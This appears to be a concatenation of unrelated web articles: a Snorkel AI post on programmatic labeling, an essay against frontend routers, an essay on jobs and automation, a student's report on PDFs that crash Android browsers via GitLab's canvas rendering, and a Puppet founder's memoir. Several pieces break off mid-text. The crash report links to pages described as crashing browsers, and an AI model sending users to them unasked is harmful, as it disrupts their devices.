                      Snorkel AI, which spun out of the Stanford AI Lab in 2019, was founded on two simple premises: first, that the labeled <b>training data</b>  machine learning models learn from is increasingly what determines the success or failure of AI applications.
                      And second, that we can do much better than labeling this data entirely by hand.
                  </p>
                  <p>
                      At the Stanford AI lab, the Snorkel AI founding team spent over four years developing new <b>programmatic</b> approaches to labeling, augmenting, structuring, and managing this training data.
                      We were fortunate to develop and deploy early versions of our technology with some of the world’s leading organizations like <a href="https://ai.googleblog.com/2019/03/harnessing-organizational-knowledge-for.html">Google</a>, <a href="https://dl.acm.org/doi/abs/10.1145/3329486.3329492">Intel</a>, <a href="https://arxiv.org/abs/1909.05372">Apple</a>, <a href="https://www.sciencedirect.com/science/article/pii/S2666389920300192">Stanford Medicine</a>, resulting in <a href="https://www.snorkel.ai/technology#reference">over thirty-six peer-reviewed publications</a> on our findings; innovations in weak supervision modeling, data augmentation, multi-task learning, and more; inclusion in university computer science curriculums; and deployments in popular products and systems that you’ve likely interacted with in the last few hours.
                  </p>
                  <p>
                      Through all this academic tinkering and industry spelunking, we realized two things: first, that this concept of labeling and building training data programmatically, rather than by hand, had transformational potential to make machine learning more iterative, auditable, faster to deploy, and ultimately, more practical.
                      And second, that these ideas changed not just how you label training data, but so much of the entire lifecycle and pipeline of ML: how knowledge and feedback is injected; how models are constructed, trained, versioned, and monitored; how entire pipelines are developed iteratively; and how the full set of stakeholders in any ML deployment, from subject matter experts to ML engineers, are incorporated into the process.
                  </p>
                  <p>
                      In other words, we saw that this shift to programmatic training data required a top-to-bottom rewrite of the entire ML development and deployment process.
                      With the support of some amazing investors (Greylock, GV, In-Q-Tel, and others) and incredible early customers, we’ve spent the last year doing just this: building and deploying <a href="https://www.snorkel.ai/platform">Snorkel Flow</a>, an end-to-end platform to support this new vision of the ML process.

                  <h2>The Training Data Bottleneck</h2>
                  <p>
                      Snorkel Flow was motivated first and foremost by a growing realization that training data had become the key bottleneck in much of ML pipeline and AI application development.

                      <b>Today’s ML successes often rest on a hidden cost: massive, hand-labeled training datasets.</b>
                      In the last decade, we’ve seen a tectonic shift in AI and ML towards powerful but data-hungry representation learning models.
                      These models—often deep learning architectures—are not only more powerful at obviating traditionally manual development tasks like feature engineering and bespoke model design, but also have never been more accessible in the open source.
                      However, there’s no such thing as a free lunch: these models are highly complex, with tens to hundreds of millions of parameters, and they require massive labeled training datasets to learn from.
                      And, other than in special scenarios where labels are naturally derivative of existing processes, these training datasets need to be labeled by hand.
                  </p>
                  <p>
                      <b>The hand-labeled training data interface to ML has enabled tremendous progress, but is also ridiculously broken.</b>
                      Consider a simple example: a legal analyst at a bank wants to train a contract classification model, and wants to inject a simple heuristic into the ML model: that if “employment” is in the title, the contract should be labeled as an “Employment contract.”
                      Simple, right?
                      Not so.
                      Theoretically, to communicate this specific feature to a machine learning model via only labeling individual data points could require thousands of examples (roughly, inversely proportional to the sparsity of the feature space).
                      From this perspective, it’s like playing 20 questions rather than just communicating the answer directly—fine if you have a massive question-answer bank, but otherwise wholly impractical.
                  </p>
                  <p>
                      <b>Manually labeling training data is prohibitively expensive–especially when expertise and privacy are required.</b>
                      Building training datasets often requires <a href="http://nytimes.com/2018/11/25/business/china-artificial-intelligence-labeling.html">armies of human labelers</a> at massive cost and time expense.
                      For example, ImageNet—one of the foundational projects behind ML’s current explosive progress—took <a href="https://qz.com/1034972/the-data-that-changed-the-direction-of-ai-research-and-possibly-the-world/">over two years</a> to create.
                      However, labeling cats, dogs, stop signs, and pedestrians is one thing; labeling data like medical images, legal and financial contracts, government documents, user data, and network data requires <b>stringent privacy protections</b> and <b>subject matter expert labelers</b>.
                      This means for sectors like financial services, government, telecommunications, insurance, healthcare, and more, creating training data (and by extension, using ML) is either a hugely expensive on-premise activity—or more often, one that is just not feasible to tackle, let alone practical.
                  </p>
                  <p>
                      <b>Iterative development is not possible with hand-labeled data.</b>
                      From an engineering and data science perspective, manually labeled training data fundamentally breaks the ability to quickly iterate, which is absolutely essential in real world settings where input data, output goals, and annotation schema change all the time.
                      From a business perspective, training data is an expensive asset that can’t be reused across projects, can often depreciate to worthless overnight due to changing conditions or business goals, and that presents growing risks—everything from <a href="https://web.archive.org/web/20200703104247/https://cloud.google.com/ai-platform/data-labeling/docs">COVID-related delays</a> to <a href="https://www.theverge.com/2018/1/12/16882408/google-racist-gorillas-photo-recognition-algorithm-ai">issues of bias</a>.

                  <h2>A New Input Paradigm for ML: Programming with Data</h2>
                  <p>
                      With Snorkel Flow, rather than needing to hand-label any training data, users develop <b>programmatic operators</b> that label, augment, and build training data to drive the ML development process.
                  </p>
                  <p><img data-src="https://d33wubrfki0l68.cloudfront.net/ae088a1fc7f3c6326c2e7285bc2d3c7e88907290/ad302/images/platform-label-v3.png" alt="" src="https://d33wubrfki0l68.cloudfront.net/ae088a1fc7f3c6326c2e7285bc2d3c7e88907290/ad302/images/platform-label-v3.png"></p><p>
                      <b>Programmatically labeling and building training data.</b>
                      With Snorkel Flow, the idea is to instead communicate this domain knowledge directly via a programmatic operator like a <a href="https://papers.nips.cc/paper/6523-data-programming-creating-large-training-sets-quickly">labeling function</a>.
                      For example, our legal analyst could write a labeling function that labels documents as “Employment contracts” if the word “employment” is in the title, and otherwise abstains; or, a range of more complex and powerful labeling functions relying on internal knowlegebases, models, legacy heuristics, and more.
                      This approach of effectively programming ML with data is simple, direct, interpretable, modifiable, and agnostic to the model used (which is especially important given the ongoing Cambrian explosion of powerful new open source model architectures).
                  </p>
                  <p>
                      <b>The directness of rules with the flexibility of ML.</b>
                      Rule-based systems have long been used in industry for certain tasks—as an input, individual rules have the desirable property of being direct and interpretable.
                      However, rules can also be brittle, and lack the robustness, flexibility, and sheer power of ML approaches.
                      With Snorkel Flow, you get the best of both worlds: rules (and other interpretable resources) as inputs, and powerful ML models that generalize beyond these rules as the output.
                  </p>
                  <p><img data-src="https://d33wubrfki0l68.cloudfront.net/8b9653f8e7b7803550e9afd55284d43beb190fbe/e2b34/images/platform-manage-v3.png" alt="" src="https://d33wubrfki0l68.cloudfront.net/8b9653f8e7b7803550e9afd55284d43beb190fbe/e2b34/images/platform-manage-v3.png"></p><p>
                      <b>A more powerful yet weaker supervision.</b>
                      At the same time that this programmatic supervision is advantageous in several transformational ways, it is also messier and raises fundamental new technical challenges.
                      The labeling functions and other programmatic operators that users write will have varying unknown accuracies and expertise areas, will overlap and disagree with each other, and may be correlated in tangled and unknown ways.
                      We focused on the algorithmic and systems solutions to these issues over <a href="https://www.snorkel.ai/technology">four-plus years of research</a>, showing both empirically and theoretically that with the right techniques, these deep technical challenges can be overcome.
                      The result: training data that is as good as or better than hand-labeled data, and immensely more practical to create and maintain.
                  </p>
                  <p>
                      <b>Beyond labeling: data augmentation, slicing, monitoring, and more.</b>
                      In high-performance production ML, training data is about a lot more than labeling.
                      For example, data augmentation is a cornerstone technique wherein transformed copies of data (e.g. rotated or blurred images) are used to expand the sizes of training datasets, and make resulting models more robust.
                      Slicing or structuring training datasets into more or less important and difficult subsets is also a critical part of managing production ML. 
                      Finally, monitoring and adapting not just models but …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>So&nbsp;you are building a&nbsp;client-side web app for that next big project and wondering: “Which router should I&nbsp;use?”. Here is&nbsp;the thing: you don’t need any, and you will understand why shortly.</p><h2>What is&nbsp;routing?</h2><p>The first interface for a&nbsp;user to&nbsp;access any website is&nbsp;their browser address bar. Even if&nbsp;your website is&nbsp;visited via a&nbsp;link or&nbsp;from bookmarks, for a&nbsp;user it&nbsp;still goes through the address bar. Change of&nbsp;the address leads to&nbsp;a&nbsp;change of&nbsp;the page.</p><p>Our application needs to&nbsp;determine from that URL which screen and in&nbsp;what state to&nbsp;show to&nbsp;the user.</p><figure><img src="https://forweb.dev/en/blog/drop-the-router/one-step-away.jpg" alt="“One step away” by&nbsp;Anna Zarubey" srcset="https://forweb.dev/en/blog/drop-the-router/one-step-away@2x.jpg 2x" width="1000" height="563"><figcaption>“One step away” by&nbsp;<a href="https://t.me/anna_zarubey">Anna Zarubey</a></figcaption></figure><p>So, in&nbsp;a&nbsp;nutshell, routing is&nbsp;deriving the state from the input URL. Yes, that simple.</p><h2>Why is&nbsp;routing difficult then?</h2><p>When we&nbsp;scale our app, we&nbsp;split the state into many pieces. There are two reasons to&nbsp;do&nbsp;it:</p><ol><li>it&nbsp;helps to&nbsp;avoid cognitive overload;</li><li>it&nbsp;allows sharing the workload between several team members.</li></ol><p>Usually, we&nbsp;don’t need all the pieces at&nbsp;once, so&nbsp;we&nbsp;put them to&nbsp;different endpoints and storages. When a&nbsp;user opens the app, we&nbsp;reconstruct the required state from little pieces scattered all over the system. Moreover, some of&nbsp;the state pieces determine which subset of&nbsp;other pieces should be&nbsp;restored.</p><figure><img src="https://forweb.dev/en/blog/drop-the-router/state-reconstruction.jpg" alt="Example state reconstruction scheme, drawing by&nbsp;Anna Zarubey" srcset="https://forweb.dev/en/blog/drop-the-router/state-reconstruction@2x.jpg 2x" width="1000" height="563"><figcaption>Example state reconstruction scheme, drawing by&nbsp;<a href="https://t.me/anna_zarubey">Anna Zarubey</a></figcaption></figure><p>Sometimes state reconstruction is&nbsp;simple. For example, when a&nbsp;user requests the login page, we&nbsp;should just give them the login page. Most of&nbsp;the time, though, this logic is&nbsp;a&nbsp;lot more complex, depending on&nbsp;the current context, system state, and business requirements.</p><p>The question is&nbsp;how much of&nbsp;this logic should we&nbsp;own, and how much could we&nbsp;generalize and delegate to&nbsp;routing via a&nbsp;framework or&nbsp;a&nbsp;library?</p><p>Naturally, we&nbsp;would prefer to&nbsp;delegate as&nbsp;much code as&nbsp;possible. There are different approaches to&nbsp;that. One of&nbsp;them would be&nbsp;to&nbsp;fully separate routing and business logic.</p><p>For instance, we&nbsp;could match a&nbsp;path to&nbsp;some handler function and pass query parameters to&nbsp;it. Then it&nbsp;will decide how to&nbsp;restore the state and what to&nbsp;show to&nbsp;the user.</p><p>It&nbsp;could look like this (🔀 is&nbsp;for routing, 🅱️️ is&nbsp;for business logic, ❇️ is&nbsp;for dependencies loading):</p><pre><code>🔀 Receive request path with parameters in&nbsp;it
    🔀 Determine handler for this path and separate parameters
        ❇️ Load user session
            🅱️ Check if&nbsp;the user is&nbsp;authenticated
        ❇️ Load user profile
            🅱️ Check if&nbsp;the user is&nbsp;authorized to&nbsp;use this handler
        ❇️️ Load the first item from the path with parameter
            🅱️ Check if&nbsp;it&nbsp;exists
            🅱️ Check if&nbsp;the user is&nbsp;authorized to&nbsp;use&nbsp;it
        ❇️️ Load the second item from the path with parameter
            🅱️ Check if&nbsp;it&nbsp;exists
            🅱️ Check if&nbsp;it&nbsp;is&nbsp;relevant to&nbsp;the first item
            🅱️️ Check if&nbsp;the user is&nbsp;authorized to&nbsp;use&nbsp;it
        🅱️️ ... (Other business logic)
    🔀 Return the combined result
</code></pre><p>After a&nbsp;while, we&nbsp;will notice that most of&nbsp;these handlers mainly consist of&nbsp;the same instructions&nbsp;— session loading and authentication check, for instance. Maybe we&nbsp;could separate all these checks into another layer to&nbsp;stop repeating the same thing all over again?</p><p>Paths are hierarchical by&nbsp;design, which can be&nbsp;used to&nbsp;simplify our code. Like, we&nbsp;can agree that all the authenticated paths start with <code>/user</code> — meaning we&nbsp;could match paths from left to&nbsp;right and apply different checks depending on&nbsp;where we&nbsp;are in&nbsp;the hierarchy right now.</p><p>Welcome to&nbsp;the concept of&nbsp;Routing Middleware. It&nbsp;is&nbsp;still business logic, but it&nbsp;also can’t be&nbsp;separated from paths structure. So&nbsp;it&nbsp;is&nbsp;still routing too.</p><p>Both routing and business logic? Too complicated! We&nbsp;wanted a&nbsp;clear separation to&nbsp;delegate as&nbsp;much routing code as&nbsp;possible. Instead, we&nbsp;got the opposite. Screw middleware then. Why don’t we&nbsp;just define the list of&nbsp;all the checks and dependencies for each route?</p><p>That would work, but we&nbsp;still need to&nbsp;provide context for those. For authentication and handler authorization it’s quite straightforward&nbsp;— we&nbsp;can identify the user from the named cookie passed in&nbsp;the request context. But what about data availability and access control? Do&nbsp;we&nbsp;need to&nbsp;invent an&nbsp;additional language to&nbsp;extract ids from the path? Or do we need to always name those ids using a naming convention to uniformly map ids to checks?</p><p>We&nbsp;also want to&nbsp;optimize things, so&nbsp;we&nbsp;need to&nbsp;define sequences or&nbsp;relations for dependencies loading and checks. And some of&nbsp;them could be&nbsp;done in&nbsp;parallel&nbsp;— that should be&nbsp;defined too. Do&nbsp;we&nbsp;need one more language? Or&nbsp;do&nbsp;we&nbsp;do&nbsp;it&nbsp;imperatively? Then how is&nbsp;it&nbsp;different from middlewares?</p><p>These questions make routing such a&nbsp;difficult task.</p><p>Should it&nbsp;be&nbsp;so&nbsp;hard, though? Maybe backend already solved all the problems, and frontend should repeat after it’s elder brother? It&nbsp;already does, but there are multiple important obstacles along the way.</p><h2>How is&nbsp;frontend routing different from backend routing?</h2><p>First, <strong>we&nbsp;usually can’t have all the logic on&nbsp;the client-side</strong>: data is&nbsp;stored on&nbsp;a&nbsp;remote server, and we&nbsp;need to&nbsp;check if&nbsp;data is&nbsp;still valid to&nbsp;perform the desired transition. An&nbsp;observant reader will note that the same problems exist on&nbsp;the backend: database requests are asynchronous. The problem&nbsp;is: asynchronous nature of&nbsp;data requests is&nbsp;conflicting with the synchronous nature of&nbsp;the core concept of&nbsp;the web&nbsp;— links.</p><p>By&nbsp;saying links are synchronous, I&nbsp;don’t mean they transfer you immediately to&nbsp;your target, rather that they don’t require writing any asynchronous javascript. The web platform already handles the links for&nbsp;us.</p><p>This takes&nbsp;us to&nbsp;the second point. <strong>We&nbsp;need to&nbsp;entertain users while they are waiting</strong>. Modern web apps try to&nbsp;behave more like native apps rather than websites of&nbsp;the past. To&nbsp;make transitions smooth and seamless, we&nbsp;handle link clicks with javascript implementing from scratch all the logic provided by&nbsp;the platform.</p><p>User falls for this little deception and assumes that all the required resources are already on&nbsp;their device, so&nbsp;there is&nbsp;no&nbsp;need to&nbsp;load the whole page from the server&nbsp;— it&nbsp;can be&nbsp;just shown. It&nbsp;could be&nbsp;a&nbsp;smooth transition, or&nbsp;skeleton&nbsp;UI, or&nbsp;just plain old loader&nbsp;— in&nbsp;any case, we&nbsp;need to&nbsp;show something immediately after user interaction. On&nbsp;the contrary, waiting for a&nbsp;response from the backend is&nbsp;handled by&nbsp;the platform.</p><p>Third, <strong>client-side logic requires request chains</strong>. We&nbsp;have to&nbsp;ask the server for the first data chunk, then decide to&nbsp;load one of&nbsp;the next chunks depending on&nbsp;the first, then load all the items from the list in&nbsp;the second chunk... Only after a&nbsp;long chain of&nbsp;async requests we&nbsp;finally can make the transition.</p><p>The backend also has dependent data requests, but they could be&nbsp;optimized with stored procedures or&nbsp;JOIN queries. The only attempt to&nbsp;do&nbsp;something similar for the frontend is&nbsp;GraphQL, but it&nbsp;comes with a&nbsp;lot of&nbsp;disadvantages (which are out of&nbsp;the scope of&nbsp;this article).</p><p>And the last one&nbsp;— on&nbsp;the frontend, we&nbsp;sometimes have <strong>virtual routes</strong>, meaning we&nbsp;have different screen states for the same path. Because, well, you filled the first two steps of&nbsp;that wizard form&nbsp;— so&nbsp;we&nbsp;need to&nbsp;show you the third one and not allow you to&nbsp;go&nbsp;to&nbsp;the fourth one.</p><h2>Why none of&nbsp;the popular routers solve the problem?</h2><p>For some unknown reason, most of&nbsp;the popular routing solutions for web frontend focus on&nbsp;the tip of&nbsp;the iceberg, while making some significant mistakes in&nbsp;core architecture design.</p><h3>Mistake #1: defining routes in&nbsp;the view layer</h3><figure><img src="https://forweb.dev/en/blog/drop-the-router/off-label.jpg" alt="“Off-label” by&nbsp;Anna Zarubey" srcset="https://forweb.dev/en/blog/drop-the-router/off-label@2x.jpg" width="1000" height="563"><figcaption>“Off-label” by&nbsp;<a href="https://t.me/anna_zarubey">Anna Zarubey</a></figcaption></figure><p>As&nbsp;you already know, the routing process is&nbsp;heavily dependent on&nbsp;business logic. The only two cases when routing and view should collide are mapping resolved state to&nbsp;page and rendering links.</p><p>So&nbsp;there is&nbsp;no&nbsp;actual reason to&nbsp;use your view logic for routes definition. And when you do&nbsp;something without cause, you make your code difficult to&nbsp;understand and maintain.</p><p>It&nbsp;still works quite well on&nbsp;small apps, though, because they don’t have any complex or&nbsp;asynchronous business logic, and the only thing they need is&nbsp;a&nbsp;list of&nbsp;route-page pairs.</p><h3>Mistake #2: routing as&nbsp;a&nbsp;simple mapping from paths to&nbsp;pages</h3><figure><img src="https://forweb.dev/en/blog/drop-the-router/obvious.jpg" alt="“Obvious” by&nbsp;Anna Zarubey" srcset="https://forweb.dev/en/blog/drop-the-router/obvious@2x.jpg 2x" width="1000" height="563"><figcaption>“Obvious” by&nbsp;<a href="https://t.me/anna_zarubey">Anna Zarubey</a></figcaption></figure><p>Some routers selling point is&nbsp;the declarative style of&nbsp;routes definition. Meaning the whole routing problem is&nbsp;just a&nbsp;key-value dictionary.</p><p>No, it’s not. It&nbsp;could&nbsp;be, but only in&nbsp;simple hello-world-ish cases, which get complex as&nbsp;soon as&nbsp;your app becomes one month old.</p><p>In&nbsp;general, it&nbsp;is&nbsp;a&nbsp;fully-fledged process with dependency loading, data processing, and decision-making. It&nbsp;is&nbsp;also full of&nbsp;side effects: from external dependencies and data loading to&nbsp;browser history management.</p><h3>Mistake #3: immediate transitions</h3><p>Let’s assume you are on&nbsp;a&nbsp;simple website with no&nbsp;javascript at&nbsp;all. When you click the link, are you immediately transitioned to&nbsp;your destination? No, even in&nbsp;this simple case, you have to&nbsp;wait until the next page is&nbsp;loaded.</p><p>Waiting for transitions is&nbsp;in&nbsp;the DNA of&nbsp;the web from day one. We&nbsp;got used to&nbsp;waiting after clicking the link, and we&nbsp;<strong>expect the next page to&nbsp;be&nbsp;loaded</strong>. This means it’s ok&nbsp;to&nbsp;wait because&nbsp;I requested my&nbsp;entire friend list, and that’s a&nbsp;lot of&nbsp;data, and I’m on&nbsp;2G&nbsp;internet in&nbsp;the middle of&nbsp;nowhere, so&nbsp;I totally understand.</p><p>A&nbsp;router should allow to&nbsp;transition out of&nbsp;the page, handle waiting time, then transition to&nbsp;the next page. That’s what browsers already do&nbsp;with websites, and the least we&nbsp;can do&nbsp;is&nbsp;not break&nbsp;it.</p><h3>Mistake #4: no&nbsp;place for dependencies or&nbsp;common behavior</h3><figure><img src="https://forweb.dev/en/blog/drop-the-router/ever-ready.jpg" alt="“Ever-ready” by&nbsp;Anna Zarubey" srcset="https://forweb.dev/en/blog/drop-the-router/ever-ready@2x.jpg 2x" width="1000" height="563"><figcaption>“Ever-ready” by&nbsp;<a href="https://t.me/anna_zarubey">Anna Zarubey</a></figcaption></figure><p>It&nbsp;is&nbsp;generally a&nbsp;combination of #2 and #3 but feels like something to&nbsp;be&nbsp;addressed explicitly.</p><p>Routers tend to&nbsp;work with pages as&nbsp;if&nbsp;the app already has everything it&nbsp;needs to&nbsp;display every page. And that may be&nbsp;true for a&nbsp;calculator, or&nbsp;some mini-game.</p><p>In&nbsp;reality, we&nbsp;have network-heavy applications, which require both data loading and a&nbsp;lot of&nbsp;javascript and styles to&nbsp;display&nbsp;it.

<p>Why do we see defeat and destruction in the occupations of cities but definition and duty in the occupations of men?</p>



<p>In both cases, occupations seize control of the occupied entity, and yet it is cursed in the first instance but celebrated in the second.</p>



<p>Occupations do not defeat cities and define men. They defeat cities and defeat men.</p>



<p>It is our very preoccupation with occupations that stops us from noticing its own nature.</p>



<p>The occupied man does not seriously consider the possibility of living without an occupation any more than the man born into a city that has been occupied for centuries considers that it must not be so forever.</p>



<p>We are blinded by a bias which believes the present will persist. We fail to imagine a future that is radically different, though that is what has happened over and over again, decade after decade, by a degree which has been dramatically accelerating over the course of the last century.</p>



<p>We view automated industry almost exclusively as a threat while ignoring the opportunity that comes along with it. Automation may offer the potential to free ourselves from our occupations through the automated and automatic satisfaction of our most <a href="https://blogofjake.com/2020/03/31/the-eleven-human-needs/">essential human needs</a>. Such a standard would free us from necessarily having to do anything while simultaneously empowering us to do almost anything.</p>



<p>We have little gratitude for the generations of humans who have succeeded collectively in driving us to this defining moment in the unfathomably long but universally short history of humanity. We fail to appreciate even those alive today who are pressing us forward faster than ever, choosing instead to nitpick flaws and cancel the courageous. These brave leaders know that we are close. They consider this time the luckiest ever to be alive, and so do I.</p>



<p>People fear the new world because it is so different from the one we have known and that any generation before us has ever known. Those who have gained power in this long era of history will not willingly give their power away. They will fight in an effort to delay the disruptive forces but they will fail to realize that while their power over others will be taken away so too will the power of others over them.</p>



<p>Why should we all be satisfied with living in the middle of this chain of occupations where our lives are seized so that we may seize the lives of others and so that we may use our monies not to free ourselves from seizure but rather to seize possession of mostly meaningless goods and services which only serve to ensure the continuance of our dependence on our occupations as our growing wants overshadow our modest needs and the margin between the earnings we sell our lives for and the expenses we feel obligated to incur becomes ever narrower.</p>



<p>Some will read this and criticize me for being privileged, young, and ignorant. I cannot help but that I am the first two of these things. As for the third, is ignorance not at least as good to admit as certainty is to claim? Is it not as worthwhile to consider my opinion as it would be that of a disadvantaged old man who is certain of everything he knows? My privilege, youth, and ignorance may have assisted me in recognizing these truths but that does not mean that others less fortunate than myself cannot also recognize them and seek to apply them in their own lives however they may.</p>



<p>We cannot all escape occupation overnight, but we can recognize our preoccupation with occupations, and we can begin to think differently such that there may be another way to live.</p>

    <p>Mobile browsers are far from perfect. Browsing larger GitHub Source files, slow loading websites with one gig of images and js. They are just not done for it. However, there are things, that should just not be.</p>

<!--abstract-->

<hr>

<blockquote>
  <p>I am a student in my second semester of computer science. I have a lot of stuff to learn, but this is something that “I don’t enjoy”. Just do not build it in the first place. Done.</p>
</blockquote>

<p>A fellow student of mine, send me a lecture notes to a module to prepare for my exams. We have an own GitLab instance running for our university where every student is free to create and share their work. In this case, a user create a repo for a specific module to store the source files and final PDF of his lecture notes. So far, so good.</p>

<p>Got the link, opened up on my smartphone, waited for the PDF to load and … crash. The browser closed, the homescreen restarted. Wait, what? Opened up the messenger, clicked the link again, waited for the PDF to load. Crash. My first thought was, my phone was just too bad. But I have a Samsung Galaxy S9, nothing low end, nothing ultra. But does the job in everything … except this. So I started digging.</p>

<p>First off, GitLab (at least the version 13.1.3-ee, used by our university) renders the PDF file in a HTML canvas, each page, one canvas. First thought, maybe there are too many pages. No, there are just 90 pages in that PDF. But as I have exams coming up, I cannot dig deeper into the JavaScript Part of GitLab. So I did some other testing for now instead.</p>

<p>The default Browser I have on my phone is Chrome v83.0.4103.106 and additionally Firefox v68.10.1, running on Android 10 and One UI v2.1 (build number: QP1A.190711.020.G960FXXU9ETF5). So I know Chrome fails to render the PDF in 90 Canvas elements. So I checked Firefox, same thing happens. With this knowledge I asked in the computer science group of my university, for other people to verify this behavior and the android users could verify it. Apple users verified that it renders successfully in both Safari and Firefox on IOS. I wanted to record my screen in order to document this crash, but as lucky I am, the screen recorder app is killed straight away after the browser crashed. As I have no additional equipment to record, feel free to crash it yourself.</p>

<h3 id="how-do-we-test">how do we test</h3>

<p>Well, as the GitLab instance of my university is public and repos can be shared publicly, I still do not want to get into any trouble. But, now problem, we have GitLab itself and a small demo side I built. Technical stuff: GitLab uses PDF.js from mozilla. My version is based on one of their examples, as I am not currently able to dive into GitLab source code. For a PDF I used the ethereum PDF file, twice, to have a PDF file that is large enough. It is a bit bigger than the original PDF file I had, but roughly the same number of pages (just 78 here).</p>

<p>During the development I tested in my desktop to see if the page displays everything correctly, and then continue testing on my mobile device. During this phase I crashed by laptop while it was rendering 78Pages of PDF in the browser. Note here, my Laptop is an XPS15 with an Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz with 6 cores. Due to my time limits, I need to continue my work in the future (1 month from now).</p>

<h2 id="attention">ATTENTION</h2>

<p>THESE LINKS ARE LIKELY TO CRASH YOUR BROWSER, IF YOU ARE ON ANDROID. IF THERE IS ANY DAMAGE DONE BY OPENING THIS LINK, I HAVE WARNED YOU WITH THIS MESSAGE AND AM NOT ACCOUNTABLE FOR ANY DAMAGE. IF THE TAB LOADS, JUST CLOSE IT TO AVOID THE CRASH. I SUGGEST MY VERSION, AS YOU JUST NEED TO CLICK A BUTTON TO CRASH YOUR BROWSER.</p>

<p><a href="https://oltdaniel.at/pdf_test.html">My Version</a></p>

<p><a href="https://gitlab.com/oltdaniel/crash-pdf/-/blob/master/paper.pdf">GitLab Version</a></p>

<h3 id="conclusion">conclusion</h3>

<p>PDF files are like SVG files. You can zoom into each character without seeing any pixels. It’s a great format. But as usual, there where people that need to render PDF files to a raw canvas. Nothing wrong with it, but e.g. to keep up the Quality GitLab renders each page in a 2381x3367 canvas (at least on my computer). It is required, because if you reduce the scale there is no damn way to read the pdf in this rendered format. But that is the reason, why there are so many PDF readers on so many platforms. That is the reason why desktop browser have built-in PDF readers, because in any other format you just kill system resources and/or do not get the same visual quality.</p>

<p>In the end, I am fascinated how quickly someone can crash a browser. And I mean, really crash a browser. Nobody, expects a mobile browser crashing just by rendering a PDF file. It could be fixed in this special case, by reducing the size of each canvas, or just render pager per page (as the key example of mozilla’s PDF.js presents <a href="https://mozilla.github.io/pdf.js/examples/">here</a>).</p>

<p>More to this scenario will follow in the future with further details and demos.</p>

		<p><em>How I got here, how it went, and what happened along the way.</em><br>
<img src="https://lukekanies.com/wp-content/uploads/2020/07/DraggedImage-scaled.jpeg" width="2560" height="1920" srcset="https://lukekanies.com/wp-content/uploads/2020/07/DraggedImage-scaled.jpeg 2560w, https://lukekanies.com/wp-content/uploads/2020/07/DraggedImage-300x225.jpeg 300w, https://lukekanies.com/wp-content/uploads/2020/07/DraggedImage-1024x768.jpeg 1024w, https://lukekanies.com/wp-content/uploads/2020/07/DraggedImage-768x576.jpeg 768w, https://lukekanies.com/wp-content/uploads/2020/07/DraggedImage-1536x1152.jpeg 1536w, https://lukekanies.com/wp-content/uploads/2020/07/DraggedImage-2048x1536.jpeg 2048w" sizes="(max-width: 767px) 89vw, (max-width: 1000px) 54vw, (max-width: 1071px) 543px, 580px"><br>
I didn’t want to start a company. But I had no choice.</p>
<p>I was a SysAdmin after college, because I tried everything else and got fired from them all. I had seven jobs in two and a half years. I’m very fireable. System administration was just the chair where I happened to be sitting when the music stopped. More a safe, fun place than a source of deep passion.</p>
<p>By that point in my career, I was a little easier to keep around. More importantly, I had become worth the hassle. I did good work because I liked the puzzles.</p>
<p>I had a particular way of working. My boss would say, “You should do this thing, and you should do it this way.” He did not look at how I worked, only the result. That gave me the freedom that made the job worth it. When I told him I had finished he would say, “Great, how did you do it?” and I’d say, “Look, is that a bird?”</p>
<p>I automated everything I could, whether it needed it or not. Automation has a built-in reward mechanism. I would take this well-paying but stultifying job — <em>Type this command 1,000 times</em> — and I would reframe it: <em>How about I tell the computer to type the command 1,000 times? It will work. I’ll watch.</em> Bam! Now I can move on to other fun stuff.</p>
<p>Over time I did so much automation I kind of ran out of work. I was in Nashville at the time, while my wife was getting her PhD, so there were no interesting jobs that needed my skills. Hmm.</p>
<p>I could go to business school, but — sorry! — I don’t have any respect for the MBA. Everything I hear about business school is how valuable the network is. If I want that, I’ll take a cruise. I thought about going to law school, but it is so expensive you have to become a lawyer afterward. I didn’t want to be a lawyer. I just wanted to change my career.</p>
<p>So I was like, I’ll find someone who’s doing what I want to do—building a product to help people like me—and I’ll go and help them.</p>
<p>Oh my god, that was miserable. I lasted five months.</p>
<p>Commuting back and forth between Boston and Nashville did not help. I also had the brilliant idea of commuting seven miles each way by bike. In the winter. In Boston. I gave myself permission not to ride if it was under twenty-seven degrees. Being on the road in Boston is dangerous in a tank. On a bike, in the snow, was a cruel joke.</p>
<p>But mostly I just hated our software. I hated what we were building. At one team meeting, a senior developer said, “What does it matter what our customers think? They’ve already bought the product.” Reaction to that statement — nothing at all — told me I was in the wrong place.</p>
<p>So I left.</p>
<p>I got home. I said, I have a little money saved up, and I’ve tried everything else, and now that I think about it, I guess my dad was kind of an entrepreneur. I mean, he did run his own business for thirty years. Technically. I suppose.</p>
<p>Maybe I should start a company?</p>
<p>I know everyone in the world who is building automation tools for sysadmins, and none of them are going to build a business. “I built this, so, obviously, it’s the best.” But they’re only interested in publishing papers and getting academic tenure. Their software was already perfect, so they saw no reason to listen to anyone’s reasons for not using it.</p>
<p>I thought, what if I build something? And then listen to the people who are using it? (And maybe those who aren’t?) Hmm. Could work.</p>
<p>I quit my job. Well, I quit my job first and said, “Eh, I should probably find a way to eat.” So after trying everything else, I started a company.</p>
<p>We lived on my wife’s generous graduate student stipend of $23,000 a year — the job I quit paid $110,000 a year — and, like I said, I thought I had some money saved up. At some point the IRS sent me a letter that said, “We disagree,” and it turns out when the IRS disagrees with you, well, you know how that goes. And even if you’re right, by the time you prove you’re right, “Ok, I had ten grand, and I spent ten grand on a lawyer proving I have ten grand, and…” Just send them the check.</p>
<p>So I was broke when I started my company.</p>
<p>As a sysadmin, you’re not a developer. People will tell you: In DevOps, everyone’s a developer. Those people are lying to you. Or selling something. Which, you know. So I had to become a developer. I had written some code before Puppet, maybe 5,000 lines total. But by the time I handed it over, it was 130,000 lines of code.</p>
<p>The people I handed it to regretted my learning experience.</p>
<p>I adored it.</p>
<p>I learned a lot. It was, to be frank, super fun. One of the densest learning periods of my life. Programming is the best puzzle. I find it harder to step away from it than anything else I’ve ever done. It’s been two days since I ate, I think my wife has been trying to get my attention for the past twelve hours, I should probably … and then I try to move, my legs don’t work. I’m lightheaded from hunger and my feet are tingly.</p>
<p>Good times.</p>
<p>After about ten months I got my first paying customer.</p>
<p>I often advise other entrepreneurs. Much of what I tell them is to avoid what I did. I only had a vague idea for how to make money. I figured, “I’m confident I can make something valuable. I kind of have a plan, but I know my plan is stupid. If I bring my plan to people and listen to them, that could help make my plan less stupid.”</p>
